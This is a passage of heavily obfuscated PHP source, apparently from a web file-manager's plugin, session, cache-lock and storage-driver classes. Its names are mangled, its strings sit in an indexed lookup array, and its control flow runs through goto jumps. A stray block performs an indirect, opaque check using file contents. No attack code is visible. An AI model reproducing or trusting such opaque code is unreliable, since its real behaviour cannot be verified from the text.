(!$E¹îÑîå) { return; } foreach ($E¹îÑîå[$dÕÑåà‰Ö¦[367]] as $c–Ç¾ëÅîâ => $b‡‚ìÃö¹) { if ($b‡‚ìÃö¹[$dÕÑåà‰Ö¦[393]] == $a¸©®ÒïŒ) { $E¹îÑîå[$dÕÑåà‰Ö¦[367]][$c–Ç¾ëÅîâ][$dÕÑåà‰Ö¦[1119]] = $d…§Ú…Öëç; self::saveData($E¹îÑîå[$dÕÑåà‰Ö¦[1121]], $E¹îÑîå[$dÕÑåà‰Ö¦[367]]); return !0; } } return !1; } public static function fileInfo($D¡äÌ™ÂÈ, $Còà–Å‰ˆ¿) { goto Aé®ã…‰; eôğØŞğ: return IO::info($fëÎ …™®¶); goto E×„ğè‘Ù; Aé®ã…‰: $FÙ°õºâÎÃ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cê¸ºöÌìà = self::listData($D¡äÌ™ÂÈ); if (!$Cê¸ºöÌìà) { show_json(LNG($FÙ°õºâÎÃ[105]), !1); } goto fòÕ‚Æ£â˜; fòÕ‚Æ£â˜: $fëÎ …™®¶ = $FÙ°õºâÎÃ[33]; foreach ($Cê¸ºöÌìà[$FÙ°õºâÎÃ[367]] as $eÇŒŸªİ¾’ => $aâ“‘¡öò‰) { if ($aâ“‘¡öò‰[$FÙ°õºâÎÃ[393]] != $Còà–Å‰ˆ¿) { continue; } $fëÎ …™®¶ = $Cê¸ºöÌìà[$FÙ°õºâÎÃ[1120]] . $aâ“‘¡öò‰[$FÙ°õºâÎÃ[28]]; break; } if (!$fëÎ …™®¶) { show_json(LNG($FÙ°õºâÎÃ[105]), !1); } goto eôğØŞğ; E×„ğè‘Ù: } public static function fileOut($f“°»¿±àí, $fã—ÓÜˆä®, $aŞÈËêÇÇ‹ = false) { $Dô–èÙ ˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c¦ù¾ùñÙš = self::fileInfo($f“°»¿±àí, $fã—ÓÜˆä®); $aÇÒÆ´®Ï¤ =& $GLOBALS[$Dô–èÙ ˜[7]]; $aŞÈËêÇÇ‹ = isset($aÇÒÆ´®Ï¤[$Dô–èÙ ˜[1085]]) && $aÇÒÆ´®Ï¤[$Dô–èÙ ˜[1085]] == 1; if (isset($aÇÒÆ´®Ï¤[$Dô–èÙ ˜[29]]) && $aÇÒÆ´®Ï¤[$Dô–èÙ ˜[29]] == $Dô–èÙ ˜[1122]) { return IO::fileOutImage($c¦ù¾ùñÙš[$Dô–èÙ ˜[76]], $aÇÒÆ´®Ï¤[$Dô–èÙ ˜[1123]]); } IO::fileOut($c¦ù¾ùñÙš[$Dô–èÙ ˜[76]], $aŞÈËêÇÇ‹, get_path_this($f“°»¿±àí)); } public static function listData($BÇäôæ…îÎ, $càÚÊ—øó¾ = true) { goto DÂ©è¾ø•–; Eë•‡Ä›¿: $fÌäÙäÌ– = IO::getContent($E¾ßÔ³•ù«[$A‚¡Ï¬[1121]]); if ($fÌäÙäÌ–) { $E•×÷¼Ê = json_decode($fÌäÙäÌ–, !0); if (is_array($E•×÷¼Ê)) { $E¾ßÔ³•ù«[$A‚¡Ï¬[367]] = $E•×÷¼Ê; } } return $E¾ßÔ³•ù«; goto dÂ¿Õ”É¼; BÀ—–ÇÊ’Ê: if (substr($BÇäôæ…îÎ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fŠŒÍõçĞä = self::pathHistory($BÇäôæ…îÎ); $E¾ßÔ³•ù« = array($A‚¡Ï¬[1121] => $fŠŒÍõçĞä . $A‚¡Ï¬[1109], $A‚¡Ï¬[1120] => rtrim(get_path_father($fŠŒÍõçĞä), $A‚¡Ï¬[8]) . $A‚¡Ï¬[8], $A‚¡Ï¬[367] => array()); goto Eë•‡Ä›¿; DÂ©è¾ø•–: $A‚¡Ï¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($càÚÊ—øó¾ && !IO::exist($BÇäôæ…îÎ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto BÀ—–ÇÊ’Ê; dÂ¿Õ”É¼: } private static function saveData($d‡²‰ˆâŞÈ, $e†¥ğåæà­) { goto bºŞÆ‹¦ˆ÷; fÊå¹¸³•: $E™Ï¢÷“·õ = IO::pathFather($d‡²‰ˆâŞÈ); IO::remove($d‡²‰ˆâŞÈ); self::clearEmptyFolder($E™Ï¢÷“·õ); goto BÔˆ‚…Ÿ–Ê; bºŞÆ‹¦ˆ÷: $eœï­ª±£ =& $_SERVER[ÒÆ›ÆØÎ¾]; self::log($eœï­ª±£[1124] . $d‡²‰ˆâŞÈ . $eœï­ª±£[68] . count($e†¥ğåæà­), $eœï­ª±£[704]); if ($e†¥ğåæà­) { return IO::setContent($d‡²‰ˆâŞÈ, json_encode($e†¥ğåæà­)); } goto fÊå¹¸³•; BÔˆ‚…Ÿ–Ê: return !0; goto AˆÇô…¼œ®; AˆÇô…¼œ®: } public static function clearEmptyFolder($AŸãİæ¬¤) { goto Bå½²ï©‹Å; F¾çÃøù˜‘: self::clearEmptyFolder($b‡Ó¶ÙšÉ); goto EŠƒçãˆã¿; eŠäÓÎ³Å: $DÈé½¤šÅ” = IO::has($AŸãİæ¬¤, !0); if ($DÈé½¤šÅ”[$fÉíÊœŒ…¬[203]] > 0 || $DÈé½¤šÅ”[$fÉíÊœŒ…¬[204]] > 0) { return; } IO::remove($AŸãİæ¬¤); goto F¾çÃøù˜‘; Bå½²ï©‹Å: $fÉíÊœŒ…¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (trim($AŸãİæ¬¤, $fÉíÊœŒ…¬[8]) == trim(self::$_historyBase, $fÉíÊœŒ…¬[8])) { return; } $b‡Ó¶ÙšÉ = IO::pathFather($AŸãİæ¬¤); goto eŠäÓÎ³Å; EŠƒçãˆã¿: } private static function getBasePath() { goto eÈÒÙòÛ™†; Fî¼®£Şó: $d˜ÈùËÈ´ = DATA_PATH . $D¯°ì—ôÅ‰[1127]; $d˜ÈùËÈ´ = IO::mkdir($d˜ÈùËÈ´); $d˜ÈùËÈ´ = rtrim($d˜ÈùËÈ´, $D¯°ì—ôÅ‰[8]) . $D¯°ì—ôÅ‰[8]; goto d‘Ú¯ÂÃ…À; eÈÒÙòÛ™†: $D¯°ì—ôÅ‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d˜ÈùËÈ´ = Model($D¯°ì—ôÅ‰[1125])->get($D¯°ì—ôÅ‰[1126]); if (IO::exist($d˜ÈùËÈ´)) { return $d˜ÈùËÈ´; } goto Fî¼®£Şó; d‘Ú¯ÂÃ…À: file_put_contents($d˜ÈùËÈ´ . $D¯°ì—ôÅ‰[1128], $D¯°ì—ôÅ‰[33]); Model($D¯°ì—ôÅ‰[1125])->set($D¯°ì—ôÅ‰[1126], $d˜ÈùËÈ´); return $d˜ÈùËÈ´; goto c…²­©­ÌÕ; c…²­©­ÌÕ: } } $Dß¾Ï«³Ïµ = $_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][785]]; goto fÍŠ„ã‰Šø; c«à“ğó¥Ò: if ($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][784]] != $_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][830]]) { goto aÇŠœ ßë; A±¡‰ïğ‹ñ: $Béñ‘–Ñà($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][785]]); goto dª¢ïŠ´; a²İ›Ò ëù: $fíö¸¥ƒŞ = explode($_SERVER[ÒÆ›ÆØÎ¾][229], $AÃ§Ã‰è¦); if (count($fíö¸¥ƒŞ) < $_SERVER[ÒÆ›ÆØÎ¾][575]) { $e²–ÒÀ© = $_SERVER[ÒÆ›ÆØÎ¾][789]; $e²–ÒÀ©(); } $Béñ‘–Ñà = $_SERVER[ÒÆ›ÆØÎ¾][790]; goto A±¡‰ïğ‹ñ; aÇŠœ ßë: $dŠ‚ÔíØ¼µ = $_SERVER[ÒÆ›ÆØÎ¾][786]; $F²ò†ÃôÑÆ = $_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][787]] . $_SERVER[ÒÆ›ÆØÎ¾][788]; $AÃ§Ã‰è¦ = $dŠ‚ÔíØ¼µ($F²ò†ÃôÑÆ); goto a²İ›Ò ëù; dª¢ïŠ´: } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\160\154\165\x67\151\156\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\164\141\164\165\163", "\162\145\x67\151\x65\x73\x74", "\x63\x6f\156\146\x69\147"); public function loadList($dŸ™„…ºí§ = false) { $A†Ïô¾âô = array_to_keyvalue($this->listData(), $_SERVER[ÒÆ›ÆØÎ¾][28]); if ($dŸ™„…ºí§) { return $A†Ïô¾âô[$dŸ™„…ºí§]; } return $A†Ïô¾âô; } public function init() { $a¬„Â×óµÓ =& $_SERVER[ÒÆ›ÆØÎ¾]; Hook::trigger($a¬„Â×óµÓ[1792]); $CÇî Ïö‚Ü = $this->loadPluginList(); foreach ($CÇî Ïö‚Ü as $eããêœ¡Ü => $d¿Ù¨ÛÇÂº) { $b»ÒŠ±Š¡‘ = $this->appAllow($eããêœ¡Ü, $d¿Ù¨ÛÇÂº); if (!$b»ÒŠ±Š¡‘) { continue; } foreach ($d¿Ù¨ÛÇÂº[$a¬„Â×óµÓ[1793]] as $C„‹†ÊõÔ => $c·ãŠ–½°Ú) { Hook::bind($C„‹†ÊõÔ, $c·ãŠ–½°Ú); } } Hook::trigger($a¬„Â×óµÓ[1794]); Hook::trigger(ACTION); } public function appAllow($c„Öù‚«œ, $CƒÌ‰ŠÆ‡‚, $BÅì˜ß—‹Û = true) { $Eõ®Ó‰¥»ï =& $_SERVER[ÒÆ›ÆØÎ¾]; $e™›”…ã¸ = PLUGIN_DIR . $c„Öù‚«œ . $Eõ®Ó‰¥»ï[1795]; if (!is_array($CƒÌ‰ŠÆ‡‚) || !is_array($CƒÌ‰ŠÆ‡‚[$Eõ®Ó‰¥»ï[1793]]) || $CƒÌ‰ŠÆ‡‚[$Eõ®Ó‰¥»ï[702]] != 1 || !is_file($e™›”…ã¸)) { return !1; } if ($GLOBALS[$Eõ®Ó‰¥»ï[485]] == 1) { return !0; } if ($BÅì˜ß—‹Û && !Action($Eõ®Ó‰¥»ï[1796])->checkAuth($c„Öù‚«œ)) { return !1; } return !0; } public function unInstall($c‚©£Àß†î) { $BÙ‚ŒØ’åï =& $_SERVER[ÒÆ›ÆØÎ¾]; $d…„©¨©‚ = $this->loadList($c‚©£Àß†î); if (file_exists(PLUGIN_DIR . $c‚©£Àß†î)) { Hook::apply($c‚©£Àß†î . $BÙ‚ŒØ’åï[1797]); } $this->remove($d…„©¨©‚[$BÙ‚ŒØ’åï[393]]); } public function changeStatus($BŒ‚ÇÇĞ‚, $f÷¡Ò”¤Ø¸) { $eå²Ä°Ã„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¿ÈŠº ê¹ = $this->loadList($BŒ‚ÇÇĞ‚); if ($f÷¡Ò”¤Ø¸) { Hook::apply($BŒ‚ÇÇĞ‚ . $eå²Ä°Ã„[1798]); } $this->update($E¿ÈŠº ê¹[$eå²Ä°Ã„[393]], array($eå²Ä°Ã„[1799] => $f÷¡Ò”¤Ø¸)); } public function appRegist($Föæ¿š, $c¹ïù³Ÿ¸ø) { $e¨‹Ú×µëß =& $_SERVER[ÒÆ›ÆØÎ¾]; $Có‘íª†¡‡ = $this->loadList($Föæ¿š); if ($Có‘íª†¡‡) { $this->update($Có‘íª†¡‡[$e¨‹Ú×µëß[393]], array($e¨‹Ú×µëß[1793] => $c¹ïù³Ÿ¸ø)); } else { $aŸ•“Ã„Î = array($e¨‹Ú×µëß[28] => $Föæ¿š, $e¨‹Ú×µëß[1793] => $c¹ïù³Ÿ¸ø, $e¨‹Ú×µëß[702] => 0, $e¨‹Ú×µëß[6] => $this->getConfigDefault($Föæ¿š)); $this->insert($aŸ•“Ã„Î); } } public function getConfigDefault($eõˆÍ´Û) { $f“ƒ¾¬ê¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÇÓ’†ˆœÅ = array(); $aŸÍ¡Ò³âé = $this->getPackageJson($eõˆÍ´Û); if (!$aŸÍ¡Ò³âé && is_array($aŸÍ¡Ò³âé[$f“ƒ¾¬ê¶[1800]])) { return $AÇÓ’†ˆœÅ; } foreach ($aŸÍ¡Ò³âé[$f“ƒ¾¬ê¶[1800]] as $D”Ë…ç„ô => $d·Ùî›²›) { if (!isset($d·Ùî›²›[$f“ƒ¾¬ê¶[372]]) || isset($AÇÓ’†ˆœÅ[$D”Ë…ç„ô])) { continue; } $AÇÓ’†ˆœÅ[$D”Ë…ç„ô] = $d·Ùî›²›[$f“ƒ¾¬ê¶[372]]; } return $AÇÓ’†ˆœÅ; } public function getPackageJson($e—ÜèãÀ†) { return Hook::apply($e—ÜèãÀ† . $_SERVER[ÒÆ›ÆØÎ¾][1801]); } public function getConfig($eÈßƒ¤ŒÉˆ, $b­ë¨Ÿ ô¦ = false) { $dï®‡½Ğ˜’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C‰Ï–§å·á = array(); $f²Ò®ä³‹§ = $this->loadList($eÈßƒ¤ŒÉˆ); if ($f²Ò®ä³‹§ && is_array($f²Ò®ä³‹§[$dï®‡½Ğ˜’[6]])) { $C‰Ï–§å·á = $f²Ò®ä³‹§[$dï®‡½Ğ˜’[6]]; } if (!$C‰Ï–§å·á || $b­ë¨Ÿ ô¦) { $C‰Ï–§å·á = $this->getConfigDefault($eÈßƒ¤ŒÉˆ); } return $C‰Ï–§å·á; } public function setConfig($E·…÷é¡“, $dÀÎÏ† ±Õ = false) { goto A„Ú—š­”ø; F›óØñâÙ‰: $this->update($F±Ñëš‘é¿[$c…«†™ö­œ[393]], array($c…«†™ö­œ[6] => $F°Ù¾ÓÑßç)); goto FÊˆ°„„Ù; dæ§Ä–à: $F°Ù¾ÓÑßç = $F±Ñëš‘é¿[$c…«†™ö­œ[6]]; if ($dÀÎÏ† ±Õ == !1) { $F°Ù¾ÓÑßç = array(); $dÀÎÏ† ±Õ = $this->getConfigDefault($E·…÷é¡“); } foreach ($dÀÎÏ† ±Õ as $C®ì×ÎÖ°Î => $DËÛÃ¦Á‰) { $F°Ù¾ÓÑßç[$C®ì×ÎÖ°Î] = is_string($DËÛÃ¦Á‰) ? trim($DËÛÃ¦Á‰) : $DËÛÃ¦Á‰; } goto F›óØñâÙ‰; A„Ú—š­”ø: $c…«†™ö­œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F±Ñëš‘é¿ = $this->loadList($E·…÷é¡“); if (!$F±Ñëš‘é¿) { return !1; } goto dæ§Ä–à; FÊˆ°„„Ù: } public function viewList() { goto a‰ïÇÊŸª§; a‰ïÇÊŸª§: $bõ†‡ˆø¯ó =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÉ¦–‡á = $this->loadList(); $this->pluginScan($fÉ¦–‡á); goto F£ğã’ë’Â; F£ğã’ë’Â: $fÉ¦–‡á = $this->loadPluginList(); $F¸ƒá¢ÖÜÑ = array(); foreach ($fÉ¦–‡á as $fÉ¢Õ¹†ºö => $bïãã²“ÃÛ) { unset($bïãã²“ÃÛ[$bõ†‡ˆø¯ó[1793]], $bïãã²“ÃÛ[$bõ†‡ˆø¯ó[6]]); $d¤Ï¿‡ÎÀ = PLUGIN_DIR . $bïãã²“ÃÛ[$bõ†‡ˆø¯ó[28]] . $bõ†‡ˆø¯ó[1795]; if (!is_file($d¤Ï¿‡ÎÀ)) { continue; } $DßÏ“ğÛ¼Ø = Hook::apply($bïãã²“ÃÛ[$bõ†‡ˆø¯ó[28]] . $bõ†‡ˆø¯ó[1801]); if (is_array($DßÏ“ğÛ¼Ø)) { $F¸ƒá¢ÖÜÑ[$fÉ¢Õ¹†ºö] = array_merge($bïãã²“ÃÛ, $DßÏ“ğÛ¼Ø); } } goto F°“ãŸŸğ; F°“ãŸŸğ: return $F¸ƒá¢ÖÜÑ; goto FîôˆÎÓÖ‚; FîôˆÎÓÖ‚: } private function loadPluginList() { $E£Ì†•µŞø =& $_SERVER[ÒÆ›ÆØÎ¾]; $e²¬ÜÇªÀ‰ = $this->loadList(); if (strtolower(MOD) == $E£Ì†•µŞø[1802]) { return $e²¬ÜÇªÀ‰; } $f©¸…ˆÃ¤ = Hook::trigger($E£Ì†•µŞø[1803], $e²¬ÜÇªÀ‰); if ($e²¬ÜÇªÀ‰ && !$f©¸…ˆÃ¤) { die; } return $f©¸…ˆÃ¤ ? $f©¸…ˆÃ¤ : $e²¬ÜÇªÀ‰; } private function pluginScan($Eº«æ¨¼‰º) { $f¼Ş¢š´˜ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; recursion_dir(PLUGIN_DIR, $EİôĞš—É, $A”İˆê­ó¦, 0); foreach ($EİôĞš—É as $F £ñ–¨¹Í) { $AçÖ·“©íá = get_path_this($F £ñ–¨¹Í); if (isset($Eº«æ¨¼‰º[$AçÖ·“©íá]) || !file_exists($F £ñ–¨¹Í . $f¼Ş¢š´˜ƒ[1804]) || !file_exists($F £ñ–¨¹Í . $f¼Ş¢š´˜ƒ[1795])) { continue; } Hook::apply($AçÖ·“©íá . $f¼Ş¢š´˜ƒ[1798]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\x6d\137\163\x65\163\x73\x69\x6f\156"; public function get($B¡ùÔ¼åÌ§) { $A…õÉ·«Ù‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b¥ëËˆ³Ş = $this->where(array($A…õÉ·«Ù‘[1805] => $B¡ùÔ¼åÌ§))->find(); if (!is_array($b¥ëËˆ³Ş)) { return !1; } return $b¥ëËˆ³Ş[$A…õÉ·«Ù‘[707]]; } public function set($E”‡Ù’«Š¥, $dÁ»ù’ò†ë, $CøÆß¿ó³ç = 3600) { $dÙÅ´²¿ÃÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b”‘¨èçÙ¥ = array($dÙÅ´²¿ÃÁ[1805] => $E”‡Ù’«Š¥, $dÙÅ´²¿ÃÁ[1714] => $dÁ»ù’ò†ë, $dÙÅ´²¿ÃÁ[1806] => $CøÆß¿ó³ç + time()); if (Session::get($dÙÅ´²¿ÃÁ[1807])) { $b”‘¨èçÙ¥[$dÙÅ´²¿ÃÁ[1517]] = Session::get($dÙÅ´²¿ÃÁ[1807]); } else { $b”‘¨èçÙ¥[$dÙÅ´²¿ÃÁ[1517]] = 0; } if ($this->get($E”‡Ù’«Š¥)) { return $this->where(array($dÙÅ´²¿ÃÁ[1805] => $E”‡Ù’«Š¥))->save($b”‘¨èçÙ¥); } else { return $this->add($b”‘¨èçÙ¥, array(), !0); } } public function remove($EÈòÊÒ³‡) { return $this->where(array($_SERVER[ÒÆ›ÆØÎ¾][1805] => $EÈòÊÒ³‡))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÒÆ›ÆØÎ¾][1808] . time())->delete(); } } goto CÇÑöÏƒ ß; a£ğ°Æ¼ôÂ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D»ää®áö©, $d†«á÷½èÜ) { $eµé—‡ÒÕÃ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->cachePath = $D»ää®áö©[$eµé—‡ÒÕÃ[76]]; $this->prefix = $eµé—‡ÒÕÃ[798]; $this->cacheTime = $d†«á÷½èÜ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($A£¡ˆíà•–) { $d–ğ°ÜÁŒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A£¡ˆíà•– = str_replace(array($d–ğ°ÜÁŒ[799], $d–ğ°ÜÁŒ[97], $d–ğ°ÜÁŒ[70]), $d–ğ°ÜÁŒ[800], $A£¡ˆíà•–); return $this->cachePath . $d–ğ°ÜÁŒ[801] . $A£¡ˆíà•– . $d–ğ°ÜÁŒ[802]; } public function set($cùØ”—Ò‚ã, $F÷ÏÜÌãí², $BÂİĞñ¾Œ¨ = false) { $aÂÀêøÛÉ‘ = $this->getFile($cùØ”—Ò‚ã); if (file_put_contents($aÂÀêøÛÉ‘, $this->prefix . $F÷ÏÜÌãí², LOCK_EX)) { @touch($aÂÀêøÛÉ‘, intval(time() + $BÂİĞñ¾Œ¨)); clearstatcache(); return !0; } @unlink($aÂÀêøÛÉ‘); return !1; } public function get($Dã’‚Æä¾¾) { $cÃ³ŒñöÅ¶ = $this->getFile($Dã’‚Æä¾¾); if (file_exists($cÃ³ŒñöÅ¶) && filemtime($cÃ³ŒñöÅ¶) < time()) { @unlink($cÃ³ŒñöÅ¶); return !1; } $b‘š×ÑğÒ— = @file_get_contents($cÃ³ŒñöÅ¶); return substr($b‘š×ÑğÒ—, strlen($this->prefix)); } public function remove($E ™Şø™Ü) { $AæÈåƒ»ª² = $this->getFile($E ™Şø™Ü); return @unlink($AæÈåƒ»ª²); } public function deleteAll() { $Eíßî¸šïô =& $_SERVER[ÒÆ›ÆØÎ¾]; $A›¾©¼ª—ğ = scandir($this->cachePath); foreach ($A›¾©¼ª—ğ as $dŠ±ÇªÉ’¸) { $E¥„Ôä‡† = $this->cachePath . $dŠ±ÇªÉ’¸; if (strpos($E¥„Ôä‡†, $Eíßî¸šïô[802]) && strpos($E¥„Ôä‡†, $Eíßî¸šïô[803])) { @unlink($E¥„Ôä‡†); } } } public function clearTimeout() { $eäöøÀƒ­È =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bíä–Èğ³ = scandir($this->cachePath); foreach ($Bíä–Èğ³ as $C”ãñ²‡¶§) { $a™±ÑğÑÇ = $this->cachePath . $C”ãñ²‡¶§; if (strpos($a™±ÑğÑÇ, $eäöøÀƒ­È[802]) && strpos($a™±ÑğÑÇ, $eäöøÀƒ­È[803]) && filemtime($a™±ÑğÑÇ) < time()) { @unlink($a™±ÑğÑÇ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto Aíùµºœ¨«; Aíùµºœ¨«: $cˆŞäÑÍÇ˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::$handle) { return self::$handle; } $bÌ§‰°ÑÂ = $GLOBALS[$cˆŞäÑÍÇ˜[6]][$cˆŞäÑÍÇ˜[347]]; goto b…˜×ç¬÷; EùÎÇ…¹À­: if ($aô¹èÁ´Ô == $cˆŞäÑÍÇ˜[17] && $FºŒíÜÃÙ == $cˆŞäÑÍÇ˜[9]) { $aô¹èÁ´Ô = $cˆŞäÑÍÇ˜[193]; } switch ($aô¹èÁ´Ô) { case $cˆŞäÑÍÇ˜[794]: self::$handle = new CacheLockRedis(); break; case $cˆŞäÑÍÇ˜[795]: self::$handle = new CacheLockMemcached(); break; case $cˆŞäÑÍÇ˜[17]: self::$handle = new CacheLockDatabase(); break; case $cˆŞäÑÍÇ˜[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto AÃ‘ÓÙ¾Ë; b…˜×ç¬÷: self::$timeout = $bÌ§‰°ÑÂ[$cˆŞäÑÍÇ˜[804]] ? $bÌ§‰°ÑÂ[$cˆŞäÑÍÇ˜[804]] : 10; $FºŒíÜÃÙ = _get($GLOBALS[$cˆŞäÑÍÇ˜[6]], $cˆŞäÑÍÇ˜[805]); $aô¹èÁ´Ô = $bÌ§‰°ÑÂ[$cˆŞäÑÍÇ˜[791]] ? $bÌ§‰°ÑÂ[$cˆŞäÑÍÇ˜[791]] : $cˆŞäÑÍÇ˜[193]; goto EùÎÇ…¹À­; AÃ‘ÓÙ¾Ë: } private static function key($b™ŸÀ”£âÜ) { return $_SERVER[ÒÆ›ÆØÎ¾][806] . Cache::key($b™ŸÀ”£âÜ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aÓòÚöÑÓ = '') { self::$errorMsg = $aÓòÚöÑÓ; } public static function lockGlobal($bò­«Í–, $bÒÚÙÑêÀº) { return self::lock($bò­«Í–, $bÒÚÙÑêÀº, !0); } public static function lock($d†ÚëåŠë¬, $BŸ×‡Ï¬âë = false, $e’ÑòÈ˜Ñ¾ = false) { goto eÙ·ºŞÃå¦; eÙ·ºŞÃå¦: $bñÚÉ÷…ÃÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bñğö„‡¦ = self::init(); $C¡Ğß¦  = self::key($d†ÚëåŠë¬); goto A÷´èá§æé; d‘…Ğ¤Á: if (!$e’ÑòÈ˜Ñ¾) { self::$lockItem[$C¡Ğß¦ ] = !0; } return $CÏ““œ”¿à; goto D“‚ùÔ’—; A÷´èá§æé: $BŸ×‡Ï¬âë = $BŸ×‡Ï¬âë ? $BŸ×‡Ï¬âë : self::$timeout; $CÏ““œ”¿à = $bñğö„‡¦->lock($C¡Ğß¦ , $BŸ×‡Ï¬âë); if (!$CÏ““œ”¿à) { $eË¸ƒÑˆ¹ë = "\x6c\157\x63\153\x20\145\162\162\x6f\162\73\x6b\145\171\x3d{$d†ÚëåŠë¬}\73\x74\x69\x6d\x65\x3d{$BŸ×‡Ï¬âë}\x3b" . self::$errorMsg . $bñÚÉ÷…ÃÍ[68] . get_caller_msg(); $D²ïÃÕ¥§Ä = LNG($bñÚÉ÷…ÃÍ[807]) . "\x28{$BŸ×‡Ï¬âë}\x73\51\56" . LNG($bñÚÉ÷…ÃÍ[808]); $D²ïÃÕ¥§Ä .= $bñÚÉ÷…ÃÍ[809]; if (is_string(self::$errorMsg) && self::$errorMsg) { $D²ïÃÕ¥§Ä = $D²ïÃÕ¥§Ä . $bñÚÉ÷…ÃÍ[810] . self::$errorMsg; } write_log($eË¸ƒÑˆ¹ë, $bñÚÉ÷…ÃÍ[811]); show_json($D²ïÃÕ¥§Ä, !1); } goto d‘…Ğ¤Á; D“‚ùÔ’—: } public static function lockGet($e”Şù¬•ô¦) { $C„Ôë À® = self::key($e”Şù¬•ô¦); if (self::$lockItem[$C„Ôë À®]) { return self::$lockItem[$C„Ôë À®]; } return self::init()->lockGet($C„Ôë À®); } public static function unlock($B…¯ƒÆ¥ƒø) { $F×Ø±áç´¬ = self::key($B…¯ƒÆ¥ƒø); self::$lockItem[$F×Ø±áç´¬] = null; return self::init()->unlock($F×Ø±áç´¬); } public static function unlockRuntime() { $CçÎùˆÌ¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dŒ†ÕŒ†ÓÌ = self::init(); $D†çÄÅÀÂš = !1; foreach (self::$lockItem as $BÔƒç˜Î => $F§„¡ŒÕø) { if (!$F§„¡ŒÕø) { continue; } $dŒ†ÕŒ†ÓÌ->unlock($BÔƒç˜Î); if (!$D†çÄÅÀÂš) { $D†çÄÅÀÂš = !0; write_log($CçÎùˆÌ¢[812] . $BÔƒç˜Î . $CçÎùˆÌ¢[68] . get_caller_msg(), $CçÎùˆÌ¢[811]); continue; } write_log($CçÎùˆÌ¢[812] . $BÔƒç˜Î, $CçÎùˆÌ¢[811]); } self::fileUnlockAll(); } public static function fileLock($CÍíò²éîé) { goto EÁÕ¡¾¹ÅÛ; EÁÕ¡¾¹ÅÛ: $d¾Ô™šª’İ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$GLOBALS[$d¾Ô™šª’İ[813]]) { $GLOBALS[$d¾Ô™šª’İ[813]] = array(); } $GLOBALS[$d¾Ô™šª’İ[813]][$CÍíò²éîé] = !1; goto fõ‡öî»µŞ; dÏ¨ùòƒ²†: return !1; goto f‡İ¥×Èë¡; fõ‡öî»µŞ: $EâÃ ¦¸²³ = fopen(DATA_PATH . $CÍíò²éîé . $d¾Ô™šª’İ[814], $d¾Ô™šª’İ[815]); if (!$EâÃ ¦¸²³) { return !1; } $GLOBALS[$d¾Ô™šª’İ[813]][$CÍíò²éîé] = $EâÃ ¦¸²³; goto AŠ»ºø×¬; AŠ»ºø×¬: if (flock($EâÃ ¦¸²³, LOCK_EX)) { return !0; } self::unlock($CÍíò²éîé); show_json($d¾Ô™šª’İ[816], !1); goto dÏ¨ùòƒ²†; f‡İ¥×Èë¡: } public static function fileUnlock($A¯Ù ¤½‚Ã) { $aŸïë»¤–Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; $B‡áÅ…óª = $GLOBALS[$aŸïë»¤–Ş[813]][$A¯Ù ¤½‚Ã]; if (!$B‡áÅ…óª) { return; } $GLOBALS[$aŸïë»¤–Ş[813]][$A¯Ù ¤½‚Ã] = !1; flock($B‡áÅ…óª, LOCK_UN); fclose($B‡áÅ…óª); } public static function fileUnlockAll() { $AœÁ´İ¤¤Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$GLOBALS[$AœÁ´İ¤¤Ë[813]]) { return; } foreach ($GLOBALS[$AœÁ´İ¤¤Ë[813]] as $a¡’˜Ïåï => $eÜ‚«®©ÎÁ) { if (!$eÜ‚«®©ÎÁ) { continue; } $GLOBALS[$AœÁ´İ¤¤Ë[813]][$a¡’˜Ïåï] = !1; flock($eÜ‚«®©ÎÁ, LOCK_UN); fclose($eÜ‚«®©ÎÁ); } $GLOBALS[$AœÁ´İ¤¤Ë[813]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto AÒƒ­É“Æî; EàÓÏˆ•¥: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($a‚Ú§°«†Š) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÒÆ›ÆØÎ¾][1251]; $this->_init($a‚Ú§°«†Š); } public function _init($eİ§Ë³±®) { $Eµ‚ƒ‚öÃÔ =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($eİ§Ë³±® as 